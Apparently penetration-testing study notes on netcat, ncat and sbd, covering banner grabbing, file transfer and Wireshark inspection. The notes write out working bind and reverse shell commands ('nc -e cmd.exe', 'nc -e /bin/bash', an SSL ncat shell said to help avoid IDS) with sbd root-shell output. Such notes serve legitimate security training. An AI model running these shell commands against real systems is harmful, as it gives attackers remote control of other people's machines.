# Essential Tools
## Netcat
### Banner Grabbing
#### Connect to port to interact with services
`nc -nv $IP $PORT`

* Check banner for application and version

##### SMTP:
`nc -nv <windows IP> 25`

##### POP3:
`nc -nv <windows IP> 110`

##### IMAP:
`nc -nv <windows IP> 143`

#### Netcat chat

On listening host:`nc -nlvp $PORT`

On connecting host:`nc -nv $IP $PORT`

Type some words, you will see it on listening host
* sent in plaintext

#### Transfer text/binary files
On listening host:`nc -nlvp $PORT > incoming.exe`

On connecting host:`nc -nv $IP $PORT < /PATH/TO/FILE`

* No feedback about file upload process
* To test, check file is working/complete

### Executing Remote Commands/Output redirection
#### Bind shell
* $Bob - Windows 
* $Alice - Kali - NATed IP

Bob: `nc -lvp 4444 -e cmd.exe`
* presents command prompt to whoever connects
* cmd shell is bound to port 4444

Alice: `nc -vn $BOB 4444`
* connects to Bob
* Presented with windows command prompt.

#### Reverse shell
* Needs Bob to connect to Alice

Bob:`nc -lvp 4444`

Alice: `nc -vn $BOB_IP 4444 -e /bin/bash`
* Bob can type linux commands and get Output
* Windows box can now control kali

## Ncat
* Netcat lacks both encryption and access limitations
* using Ncat helps avoid IDS
* modern day rewrite of Netcat

### Set up SSL bind shell

Bob: `ncat -lvp 4444 -e cmd.exe --allow $ALICE_IP --ssl`

Alice: `ncat -v $BOB_IP 4444 --ssl`
* should have a secure bind shell

To verify one, can use wireshark

### SBD

```
root@kali:~# sbd -l -p 4444 -e bash -v -n
listening on port 4444
root@kali:~# sbd 192.168.1.202 4444
id
uid=0(root) gid=0(root) groups=0(root)
```

## wireshark
### Checking for unencrypted bind shell

1. Choose interface
2. Set up filter that only captures port 4444
  * host $BOB_IP and tcp port 4444
3. Set up bind shell while Wireshark runs in background
4. Stop capture
5. "Follow TCP Stream"

You should be able to see the connection and various commands performed

### Checking for encrypted ncat ssl shell
1. Same setup as above

You should see the traffic is encrypted